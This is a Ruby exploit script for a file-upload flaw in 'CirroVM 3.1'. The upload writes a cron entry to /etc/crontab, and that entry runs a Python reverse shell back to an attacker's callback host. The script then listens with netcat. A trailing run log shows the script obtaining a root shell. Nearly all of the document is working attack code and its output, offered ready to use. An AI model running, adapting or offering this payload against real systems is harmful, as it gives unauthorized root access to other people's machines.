#!/usr/bin/env ruby
# CirroVM 3.1 (ubuntu) is vulnerable to a remote code exection
# vulnerability due to a file upload issue. An
# attacker can control the location and content
# of jdk file.

require 'rex'
require 'rex/mime'

host     = ARGV[0]
callback = ARGV[1]
lport    = ARGV[2] || "65535"

def usage
 puts "[*] CirroVM 3.1 BootStrapCirro.py Remote Code Execution"
 puts "[*] #{$0} <host> <callback> [callback_port]"
 exit
end

usage if ARGV.size < 2

begin
sock =  Rex::Proto::Http::Client.new(host, 
                                     80, 
                                     context = {}, 
                                     ssl = false)

payload = "* * * * * root /usr/bin/python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'#{callback}\',#{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);\"\n"

post_data = Rex::MIME::Message.new
post_data.add_part("", "application/octet-stream", nil, "form-data; name=\"license\"; filename=\"/mc_tmp\"")
post_data.add_part(payload,"application/octet-stream", nil, "form-data; name=\"jdk\"; filename=\"/etc/crontab\"")

res = sock.request_cgi(
	{
		'uri'     => "/",
		'version' => '1.0',
		'method'  => 'POST',
		'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
		'data'    => post_data.to_s,
	})

sock.send_request(res)
recv = sock.read_response()
 if recv.code == 200
    puts "[*] crontab uploaded, waiting for shell..."
    system("nc -v -l #{lport}")
 else
    puts "[!] upload failed!"
  end
rescue => e
puts "[!] #{e.to_s}"
end
__END__
mc@staged:/tmp$ ruby cirrovm_rce.rb 192.168.1.156 192.168.1.133 65534
[*] crontab uploaded, waiting for shell...
Listening on [0.0.0.0] (family 0, port 65534)
Connection from [192.168.1.156] port 65534 [tcp/*] accepted (family 2, sport 45370)
/bin/sh: 0: can't access tty; job control turned off
# whoami
root

